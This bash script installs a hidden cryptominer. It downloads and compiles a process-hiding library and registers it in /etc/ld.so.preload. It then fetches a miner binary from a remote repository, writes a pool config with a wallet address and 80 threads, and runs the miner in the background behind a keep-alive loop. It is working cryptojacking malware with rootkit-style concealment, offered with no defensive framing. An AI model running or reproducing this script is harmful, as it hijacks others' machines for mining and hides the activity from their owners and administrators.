#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit screen -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .lib && cd .lib
# https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
# https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
# https://github.com/barburonjilo/back/raw/main/sr srb

wget -O cidx gitlab.com/jasa4/minulme/-/raw/main/cidxC.tar.gz && tar -xvf cidx >/dev/null 2>&1

cat > config.json <<END
{
  "url": "94.156.203.170:401",
  "user": "sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.fix",
  "pass": "x",
  "threads": 80,
  "algo": "yespowersugar"
}
END
chmod +x cidx config.json

# sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
# nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool yespowerSUGAR.asia.mine.zergpool.com:6535 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive & -a yespowersugar -o stratum+tcp://yespowerSUGAR.asia.mine.zergpool.com:6535 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p c=SUGAR,mc=SUGAR,ID=zerg
nohup ./cidx -c 'config.json' &
# ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.solo --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
